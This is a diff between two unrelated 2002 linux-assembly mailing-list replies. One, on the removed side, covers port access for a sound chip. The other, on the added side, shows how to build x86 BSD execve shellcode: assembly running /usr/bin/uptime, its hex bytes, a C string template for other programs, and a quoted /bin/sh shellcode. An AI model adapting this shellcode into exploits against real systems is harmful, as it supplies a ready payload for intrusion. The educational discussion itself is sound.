@@ -1,60 +1,86 @@
-From: h-peter recktenwald <*@lxhp.in-berlin.de>
-Subject: Re: sound
-Date: Tue, 25 Jun 2002 21:28:21 +0000
+From: Stephan Walter <stephan.walter@gmx.ch>
+Subject: Re: shellcode
+Date: Wed, 26 Jun 2002 19:08:58 +0200
 Sender: linux-assembly-owner@vger.kernel.org
-Message-ID: <20020625212821.5080cb4f.*@lxhp.in-berlin.de>
-References: <3D17944F.E391DBF4@freesurf.fr>
-Reply-To: lx@lxhp.in-berlin.de
+Message-ID: <20020626190858.41e57817.stephan.walter@gmx.ch>
+References: <20020624001839.H342@nietzsche>
+	<20020625212214.4910d000.stephan.walter@gmx.ch>
+	<20020625144651.A430@nietzsche>
+	<20020625222825.428828b3.stephan.walter@gmx.ch>
+	<20020625161401.B27404@nietzsche>
 Mime-Version: 1.0
-Content-Transfer-Encoding: QUOTED-PRINTABLE
+Content-Transfer-Encoding: 7bit
 Return-path: <linux-assembly-owner@vger.kernel.org>
-In-Reply-To: <3D17944F.E391DBF4@freesurf.fr>
+In-Reply-To: <20020625161401.B27404@nietzsche>
 List-Id: <linux-assembly.vger.kernel.org>
-Content-Type: text/plain; charset="iso-8859-1"
-To: philippe <pvir@freesurf.fr>
-Cc: Linux-assembly@vger.kernel.org
+Content-Type: text/plain; charset="us-ascii"
+To: linux-assembly@vger.kernel.org
 
-On Mon, 24 Jun 2002 23:51:11 +0200
-philippe <pvir@freesurf.fr> wrote:
+Please write to the list. Others may also be interested in this. (Or
+they may be able to give better answers than mine)
 
-> hi
-> I am new on this list and my name is Philippe.
-> I used to make some programs on windows but wanted to trye on linux.
-> I have a problem with a small prog i had done for windows witch play
-> sounds on the fm chip of a sound card.
+On Tue, 25 Jun 2002 16:14:01 -0500, xlp <xlp@emtel.net.co> wrote:
 
-direct port access requires 'root' rights and the concerning ports
-being enabled, with sys_ioctl or sys_ioperm. - e.g <man 2 ioctl>
+> hi, let's say i dont want to run /bin/sh, i want to run
+> /usr/bin/uptime, How can i get all that functions in hexadecimal?
 
-> But when i translate it on linux, it doesn't work any more.
-> It compile and link correctly(nasm), but on execution it writes:
-> segmentation fault!
-> I post you the sources at the end of this message.
->=20
-> I had an other question:
-> Where can I find bible of all the interruptions and what is the  name=
- of
-> it?
+like this (no guarantee, I haven't tested this):
 
-basically, there is one interrupt and several sub-codes, passed w. eax.
-'the' bible doesn't exist, linux is in a somewhat 'fluid' state and, ba=
-dly=20
-documented. Paricularly no aequivalent to 'RBIL' but, you might get som=
-e=20
-help from my syscall pages where i collect whatever i find fairly relia=
-bly=20
-documented/tested.
-	http://www.lxhp.in-berlin.de/lhpsyscal.html
+--------------- snip ----
+BITS 32
+    xor eax,eax
+    push eax
+    push "time"
+    push "//up"
+    push "/bin"
+    push "/usr"    ; you have to push the program name like this
+    mov ebx,esp
+    push eax
+    push ebx
+    push eax
+    push esp
+    push ebx
+    mov al,0x3b
+    push eax
+    int 0x80
+--------------- snap ---
+use "nasm -f bin -o test.bin test.asm" to compile it.
+
+I compiled it for you:
+
+0000000 31 c0 50 68 74 69 6d 65 68 2f 2f 75 70 68 2f 62
+0000020 69 6e 68 2f 75 73 72 89 e3 50 53 50 54 53 b0 3b
+0000040 50 cd 80
+
+of course you'll have to remove the offset adresses and insert the
+backslashes.
+
+or use this snippet:
+if you want to change the program, just change the 4 lines (read bottom
+to top). but make shure that every string is exactly 4 bytes long and
+add "\x68" between them.
+
+char bsdshell[] =        "\x31\xc0\x50\x68"
+                  "time"
+                         "\x68"
+                  "//up"
+                         "\x68"
+                  "/bin"
+                         "\x68"
+                  "/usr"
+                         "\x89\xe3\x50\x53\x50\x54\x53"
+                         "\xb0\x3b\x50\xcd\x80";
 
 
-regards,
-	hp
---=20
-Linux,Assembly,Forth: http://www.lxhp.in-berlin.de/index-lx.shtml en/de
-NO abusive=A0software=A0patents=A0http://petition.eurolinux.org/pr/pr17=
-=2Ehtml
--
-To unsubscribe from this list: send the line "unsubscribe linux-assembl=
-y" in
-the body of a message to majordomo@vger.kernel.org
-More majordomo info at  http://vger.kernel.org/majordomo-info.html
+> why 25 bytes long?
+> %cat 1.c ; cc 1.c ; ./a.out
+> main(){
+>         char bsdshell[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+>                   "\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53"
+>                   "\xb0\x3b\x50\xcd\x80";
+>         printf("%d\n", sizeof(bsdshell));
+> }
+> 26
+
+that's right, it is 26 bytes long, but the last byte is a zero-byte
+("end of string") and isn't used for the code.
